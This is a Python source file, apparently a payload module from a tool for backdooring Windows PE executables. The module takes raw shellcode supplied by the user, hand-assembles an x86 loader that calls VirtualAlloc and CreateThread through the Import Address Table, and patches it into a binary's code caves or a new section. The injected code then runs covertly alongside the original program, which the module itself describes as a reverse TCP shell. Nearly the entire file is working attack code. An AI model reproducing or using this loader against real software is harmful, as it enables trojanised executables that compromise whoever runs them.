import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)


class iat_user_supplied_shellcode_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_user_supplied_shellcode_threaded"
        self.description = """Import Address Table reverse tcp shell """
        self.requirements = {'MODE':'How the patching will happen',
                             'SUPPLIED_SHELLCODE':'User suppled shellcode in raw format',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                                 b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'staged'
   
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Staged
        """

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                print("APIs not found")
                return False
        
        self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #Begin shellcode 2:

        
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            self.shellcode2 = b"\xe8"
            '''
            if self.PM.BDF.pe_object['XP_MODE'] is True:
                xp_offset = 0
            else:
            '''
            xp_offset = 11
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
        else:
            self.shellcode2 = b"\xE8\xE5\xFF\xFF\xFF"

        #Can inject any shellcode below.

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 58

        self.shellcode2 += self.supplied_shellcode


        self.shellcode1 = b"\xFC"             # Cld
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        '''
        self.shellcode1 += b"\xbb"           # mov value below to EBX
        #Put VirtualAlloc in EBX
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            if self.PM.BDF.pe_object['VirtualAlloc'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + self.PM.BDF.pe_object['VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] + 1)
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'])
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if self.PM.BDF.pe_object['CreateThread'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['CreateThread'] - self.PM.BDF.pe_object['ImageBase']) + 1)
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['CreateThread'] - self.PM.BDF.pe_object['ImageBase'])
        else:
            '''
        if self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x01\xD3"  # add EBX + EDX
        #Put Create Thread in ECX
        self.shellcode1 += b"\xb9"  # mov value below to ECX
        if self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))

        #Add in memory base
        self.shellcode1 += b"\x01\xD1"               # add ECX + EDX
        self.shellcode1 += b"\x8B\xE9"               # mov EDI, ECX for save keeping

        self.shellcode1 += b"\xBE"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += bytes("\x6A\x40"
                            "\x68\x00\x10\x00\x00"
                            "\x56"
                            "\x6A\x00", 'iso-8859-1')
        self.shellcode1 += b"\xff\x13"               # call dword ptr [ebx]
        self.shellcode1 += bytes("\x89\xC3"
                            "\x89\xC7"
                            "\x89\xF1"
                            , 'iso-8859-1')

        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x16"  # <--length of shellcode below

        self.shellcode1 += b"\x5e"
        self.shellcode1 += bytes("\xF2\xA4"
                            "\x31\xC0"
                            "\x50"
                            "\x50"
                            "\x50"
                            "\x53"
                            "\x50"
                            "\x50"
                            , 'iso-8859-1')

        self.shellcode1 += b"\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
        self.shellcode1 += bytes("\x58"
                            "\x61"                  # POP AD
                            , 'iso-8859-1')

        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
